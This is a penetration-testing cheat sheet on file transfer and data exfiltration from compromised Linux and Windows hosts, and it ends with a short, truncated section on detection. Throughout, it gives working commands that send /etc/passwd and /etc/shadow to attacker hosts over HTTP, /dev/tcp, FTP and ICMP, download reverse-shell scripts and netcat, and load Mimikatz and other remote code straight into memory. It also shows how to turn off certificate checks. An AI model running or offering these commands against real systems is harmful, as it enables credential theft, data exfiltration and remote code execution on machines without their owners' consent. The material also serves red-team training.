# Exfiltration

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Commonly whitelisted domains to exfiltrate information

Check [https://lots-project.com/](https://lots-project.com/) to find commonly whitelisted domains that can be abused

## Copy\&Paste Base64

**Linux**

```bash
base64 -w 0 <file> #Encode file
base64 -d file #Decode file
```

**Windows**

```bash
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll

# using powershell
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<jajajabase64here>="))  # decode
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)) # encode

```
> To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. `file <file>` `md5sum <file>` , `Get-FileHash C:\<filepath> -Algorithm md5` (on windows)

>**Note:** While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.

## HTTP

**Linux**

```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
Fileless Attacks:
```bash
#  Fileless Attacks (excut without download the file)
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | 
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

**Windows**

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

# Fileless Method (run it directly in memory)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')  
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX # pipeline input.

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
 > when the Internet Explorer first-launch configuration has not been completed, which prevents the download This can be bypassed using the parameter `-UseBasicParsing`.
 
```bash
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
 
>Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:

Windows File Transfer Methods

```bash
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```


Harmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). It is worth gaining familiarity with them and their nuances, such as a lack of proxy awareness or touching disk (downloading a file onto the target) to select the appropriate one for the situation.

### Upload files

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Python module [uploadserver](https://pypi.org/project/uploadserver/):

```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth: 
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -F 'files=@file.txt' 
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world

Invoke-FileUpload -Uri http://HOST/upload -File <path>  # powershell
```

**Alternative Web File Transfer Method**
if the server we compromised is a web server, we can move the files we want to transfer to the web server directory and access them from the web page, . A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server
```bash
# on victime
python3 -m http.server
python2.7 -m SimpleHTTPServer
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000 

# download the file from web server
wget 192.168.49.128:8000/filetotransfer.txt
```
>**Note:** When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.
### **HTTPS Server**
```bash
# on the attacker 
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server' # Pwnbox - Create a Self-Signed Certificate
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

# on victime
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure # --insecure because we used a self-signed certificate that we trust
```

others methods:
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)    
@app.route('/')    
def root():    
    print(request.get_json())
    return "OK"
if __name__ == "__main__":    
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```

## FTP

### FTP server (python)

```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21 # Anonymous authentication is enabled by default
python3 -m pyftpdlib --port 21 --write # allow upload file to the server
```

### FTP server (NodeJS)

```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```

### FTP server (pure-ftp)

```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

### **Windows** client

using powershell
```bash
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')

(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts') # upload
``` 
with cmd
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt            # download
echo PUT uploaded_creds.txt >> uploaded.txt # upload file to pwnbox
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```

## SMB

Kali as server

```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
sudo impacket-smbserver share -smb2support /tmp/smbshare # share spesifice folder

#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd` 
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test # spesifice folder

# or 
python /usr/share/doc/python3-impacket/examples/smbserver.py tmp .

#copy of a file from the shared folder 
smbclient //HOST/tmp -U guest -c 'get file.txt'
sudo mount -t cifs //HOST/tmp /mnt -o user=guest
```

Or create a smb share **using samba**:

```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```

Windows

```bash
1) # assume you have the necessary permissions to access the shared folder.
CMD-Wind> net use Z: \\<ServerName>\<SharedFolder>
CMD-Wind> net use Z: \\<ServerName>\<SharedFolder> /user:<username> <password> #For SMB using credentials
2) #copy using  windwos 
copy \\<ServerName>\<SharedFolder>\<FileName> <DestinationPath>
copy C:\path\to\file.txt \\<Linux_IP>\shared\file.txt # from windows to linux


WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks.An alternative is to run SMB over HTTP with `WebDav`, The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.
```bash
# open pwnbox , setup upload server
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous # setup server

# Now we can attempt to connect to the share using the `DavWWWRoot` directory.
# dir \\192.168.49.128\DavWWWRoot # check the folder before upload 
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\ # upload
```
## SCP

The attacker has to have SSHd running. if no setup a ssh server

```bash
# setup ssh server on attacker machine first 
sudo systemctl enable ssh
sudo systemctl start ssh
netstat -lnpt             # check the ssh port 22 open 
scp <directory>/<filename> <username>@<Attacker_IP>:"<to_folder/tmp/>"

# download 
scp <username>@<Attacker_IP>:"<to_folder/file>" .
```
>**Note:** You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.

## SSHFS

If the victim has SSH, the attacker can mount a directory from the victim to the attacker.

```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```

## NC

```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file # we can add -q 0 will close the connection once the file upload finishes
```
## Ncat
```bash
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe # --send-only for  immediately close the connection once it done.
ncat -l -p 8000 --recv-only > SharpKatz.exe # --recv-only to close the connection once the file transfer is finished
```
> Connecting to Netcat or Ncat Using /dev/tcp
> ```bash
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
cat /etc/passwd > /dev/tcp/192.168.49.128/443


## /dev/tcp

### Download file from victim

```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```

### Upload file to victim

```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```

thanks to **@BinaryShadow\_**

## **ICMP**

```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```

## **SMTP**

If you can send data to an SMTP server, you can create an SMTP to receive the data with python:

```bash
sudo python -m smtpd -n -c DebuggingServer :25
```

## TFTP

By default in XP and 2003 (in others it needs to be explicitly added during installation)

In Kali, **start TFTP server**:

```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```

**TFTP server in python:**

```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```

In **victim**, connect to the Kali server:

```bash
tftp -i <KALI-IP> get nc.exe
```

## PHP

Download a file with a PHP oneliner:

```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```

## VBScript

```bash
Attacker> python -m SimpleHTTPServer 80
```

**Victim**

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```

## Debug.exe

The `debug.exe` program not only allows inspection of binaries but also has the **capability to rebuild them from hex**. This means that by providing an hex of a binary, `debug.exe` can generate the binary file. However, it's important to note that debug.exe has a **limitation of assembling files up to 64 kb in size**.

```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```

Then copy-paste the text into the windows-shell and a file called nc.exe will be created.

* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

## Python
###  Python  - Download
```bash
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")' # python 2

python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")' # ptyhon 3
```
###  Python  - Upload
```bash
python3 -m uploadserver # on attacker
#### Uploading a File Using a Python One-liner
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
## PHP
### PHP Download 
```bash
# with File_get_contents()
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

#  with Fopen()
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

#  Download a File and Pipe it to Bash (similar to the fileless)
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
  # Note: The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.
```

## Ruby
### Ruby - Download a File
```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```
## Perl
###  Perl - Download a File 
```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```
## JavaScript
The following JavaScript code is based on [this](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068) post, and we can download a file using it. We'll create a file called `wget.js` and save the following content:
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.
```bash
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```
## VBScript
### VBScript - download a file
The following VBScript example can be used based on [this](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs). We'll create a file called `wget.vbs` and save the following content:
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
We can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.
```bash
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```


# PowerShell Session File Transfer
there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2)
[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration.
```bash
# transfer a file from `DC01` to `DATABASE01`

whoami #=> htb\administrator
hostname #=> DC01
Test-NetConnection -ComputerName DATABASE01 -Port 5985 #=> # Confirm WinRM port TCP 5985 is Open on DATABASE01
$Session = New-PSSession -ComputerName DATABASE01 # Because this session already has privileges over DATABASE01, we don't need to specify credentials

Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\ # Copy  from our Localhost to the DATABASE01 Session

Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session # Copy from DATABASE01 Session to our Localhost
```
## RDP
RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access. We can transfer files using RDP by copying and pasting. We can right-click and copy a file from the Windows machine we connect to and paste it into the RDP session.

If we are connected from Linux, we can use `xfreerdp` or `rdesktop`. At the time of writing, `xfreerdp` and `rdesktop` allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.

As an alternative to copy and paste, we can mount a local resource on the target RDP server.
```bash
# Mounting a Linux Folder Using rdesktop
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'

# Mounting a Linux Folder Using xfreerdp
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer

# To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.
```
![](https://academy.hackthebox.com/storage/modules/24/tsclient.jpg)

** on windows**:
Alternatively, from Windows, the native [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) remote desktop client can be used.
![](https://academy.hackthebox.com/storage/modules/24/rdp.png)
After selecting the drive, we can interact with it in the remote session that follows.
>**Note:** This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.

# Protected File Transfers
## File Encryption on Windows

### [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1)
This script is small and provides encryption of files and strings.

```powershell
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 

Description
-----------
Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
 
Description
-----------
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
 
Description
-----------
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
 
Description
-----------
Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
```

how to use :
```bash
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path scan-results.txt.aes
```

## File Encryption on Linux
### openssl
```bash
# Encrypting /etc/passwd with openssl
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

# Decrypt passwd.enc with openssl
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd 

# -pbkdf2 : Use safe modern key derivation (PBKDF2) instead of old weak method
# -iter : Make PBKDF2 much slower (on purpose) to defend against password guessing attacks.
```

>Remember to use a strong and unique password to avoid brute-force cracking attacks

# Catching Files over HTTPS
There is nothing worse than being on a penetration test, and a client's network IDS picks up on a sensitive file being transferred over plaintext and having them ask why we sent a password to our cloud server without using encryption. so will cover creating a secure web server for file upload operations.

## Nginx - Enabling PUT

```bash
# Create a Directory to Handle Uploaded Files
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
#  Change the Owner to www-data
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

# Create Nginx Configuration File `/etc/nginx/sites-available/upload.conf`

server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}

# Symlink our Site to the sites-enabled Directory
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/ 
# Start Nginx
sudo systemctl restart nginx.service
```

> If we get any error messages, check `/var/log/nginx/error.log`. If using Pwnbox, we will see port 80 is already in use.

```bash
# Verifying Errors
tail -2 /var/log/nginx/error.log #=> (`ddress already in use`)
ss -lnpt | grep 80 #=>  .0.0.0:80        0.0.0.0:*    users:(("python",pid=`2811`,fd=3)
ps -ef | grep 2811 #=>  python -m websockify 80 localhost:5901 -D

# We see there is already a module listening on port 80
# To get around this, we can remove the default Nginx configuration, which binds on port 80.
sudo rm /etc/nginx/sites-enabled/default

```

### Upload File Using cURL

```bash
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
#check the uploaded file:
udo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 
```


  
# Detection

Detection based on command-line blacklisting is easy to evade using techniques like case obfuscation, while whitelisting, though initially time-consuming, offers stronger and faster anomaly detection. HTTP protocols rely on client-server negotiation, with user agent strings helping servers identify clients such as browsers or tools like cURL and sqlmap. These strings are not limited to browsers and can be used by scripts or automated tools, making them useful indicators in traffic analysis. Organizations can improve detection by compiling lists of known legitimate user agents and using them in SIEM tools to isolate suspicious activity for investigation.

### Invoke-WebRequest - Client

```powershell
Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```

#### Invoke-WebRequest - Server

```bash
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```

### WinHttpRequest - Client

```powershell
$h=new-object -com WinHttp.WinHttpRequest.5.1;
$h.open('GET','http://10.10.10.32/nc.exe',$false);
$h.send();
iex $h.ResponseText
```

#### WinHttpRequest - Server

```bash
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```

### Msxml2 - Client

```powershell
$h=New-Object -ComObject Msxml2.XMLHTTP;
$h.open('GET','http://10.10.10.32/nc.exe',$false);
$h.send();
iex $h.responseText
```

#### Msxml2 - Server

```bash
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
